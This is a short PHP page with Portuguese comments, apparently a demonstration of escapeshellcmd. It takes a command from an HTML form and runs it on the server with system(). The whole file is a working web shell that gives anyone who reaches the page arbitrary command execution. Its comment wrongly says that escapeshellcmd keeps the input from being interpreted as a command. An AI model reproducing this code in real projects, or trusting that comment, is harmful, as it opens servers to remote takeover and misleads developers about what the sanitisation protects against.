<?php 

if($_SERVER['REQUEST_METHOD'] === 'POST'){

	echo "<pre>";

	$cmd = escapeshellcmd($_POST['cmd']);//identifica sinais de comando ( \ , && ) e coloca um caracter para impedir que a linha seja interpretada como um comando

	var_dump($cmd);

	$comando = system($cmd,$retorno);


	echo "</pre>";


}



?>

<form method='POST'>
	
	<input type="text" name="cmd">
	<button>Enviar</button>


</form>